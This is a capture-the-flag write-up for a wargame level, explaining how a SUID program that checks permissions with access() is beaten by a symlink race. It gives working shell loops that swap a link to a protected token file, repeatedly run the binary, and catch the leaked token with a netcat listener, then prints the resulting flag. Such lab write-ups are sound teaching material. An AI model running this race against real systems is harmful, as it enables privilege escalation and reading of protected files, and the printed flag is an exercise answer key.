# Level10

[FRENCH version](README.md)

## How to get the flag

We can see that level10 is an executable and has a SUID.

There is also a token file which is only readable by flag10.

When running level10, the executable gives the following usage:

```
level10 file host
	sends file to host if you have access to it
```

When decompiling level10, you will notice that the program sends data to port 6969.
It also uses access() to check if you have access to the file.

We can start a netcat server that will listen on port 6969 with nc:

```
nc -lv localhost 6969
```

Whatever symbolic link we make, acces() returns an error.

To pass, we have to force it.

The goal is to force access to the token, even if we lack the right.

In a 1st terminal:

```
// Infinite loop: The goal is to create temporary links to infinity.
while true; do rm -rf /tmp/truc; touch /tmp/truc; ln -sfn ~/token /tmp/truc; done
```

Note that to pass access, the file MUST be created by the user, hence the touch.

In a 2nd terminal:

```
// Try to send the symbolic link to the server
while true; do (~/level10 /tmp/truc 127.0.0.1); done
```

In a 3rd terminal: 

```
// Loop playback on the server.
// We are obliged to make a loop because otherwise nc stops after 1 reception.
while true; do nc -l 6969 ;done
```

The flag to connect to user flag10 is: woupa2yuojeeaaed06riuj63c

## The flag

```
woupa2yuojeeaaed06riuj63c
```

This token allows you to connect to flag10 and get the token for level 11.